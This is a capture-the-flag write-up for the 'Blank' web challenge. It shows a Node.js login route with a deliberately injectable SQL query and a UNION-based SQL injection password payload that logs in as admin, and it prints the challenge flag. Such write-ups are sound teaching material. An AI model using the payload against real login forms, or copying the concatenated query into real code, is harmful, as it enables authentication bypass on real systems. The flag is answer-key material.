# Blank

## Description

by `Eth007`

I asked ChatGPT to make me a website. It refused to make it vulnerable so I added a little something to make it interesting. I might have forgotten something though...

**Attachments:** [Source](https://imaginaryctf.org/r/FVauo#blank_dist.zip)  <br>
**Server:** [http://blank.chal.imaginaryctf.org](http://blank.chal.imaginaryctf.org/)

## Analysis

Let's view source:

```js
...
// Database gets created in memory, so if application is restarted no record from previous actions are stored.
const db = new sqlite3.Database(':memory:');
...
// Create users table
db.serialize(() => {
  db.run('CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT)');
}); 
...
```

Login function:
```js
app.post('/login', (req, res) => {
  // Params from post request
  const username = req.body.username; 
  const password = req.body.password; 
	
  // SQLi detected
  db.get('SELECT * FROM users WHERE username = "' + username + '" and password = "' + password+ '"', (err, row) => {
    if (err) { 
      console.error(err); res.status(500).send('Error retrieving user');
    } else {
      if (row) {
        req.session.loggedIn = true;
        req.session.username = username;
        res.send('Login successful!');
      } else {
        res.status(401).send('Invalid username or password');
      }
    }
  });
});
```

Flag function:
```js
app.get('/flag', (req, res) => {
  if (req.session.username == "admin") {
    res.send('Welcome admin. The flag is ' + fs.readFileSync('flag.txt', 'utf8'));
  }
  else if (req.session.loggedIn) {
    res.status(401).send('You must be admin to get the flag.');
  } else {
    res.status(401).send('Unauthorized. Please login first.');
  }
});
```

## Solution

Attack vector is clear, use SQLi to gain admin access. But there's one huge problem, there are no users it table.

1. We need SQLi with username `admin`
2. We need SQLi to get admin

Payload:

```
Username = admin 
Password = " UNION SELECT 1337,"junk","junk" -- 
```

<small>Password values can be anything, but UNION requires same argument count and same types (or just NULL values)</small>

Visit `/flag`
```
Welcome admin. The flag is ictf{sqli_too_powerful_9b36140a}
```
::: tip Flag
`ictf{sqli_too_powerful_9b36140a}`
:::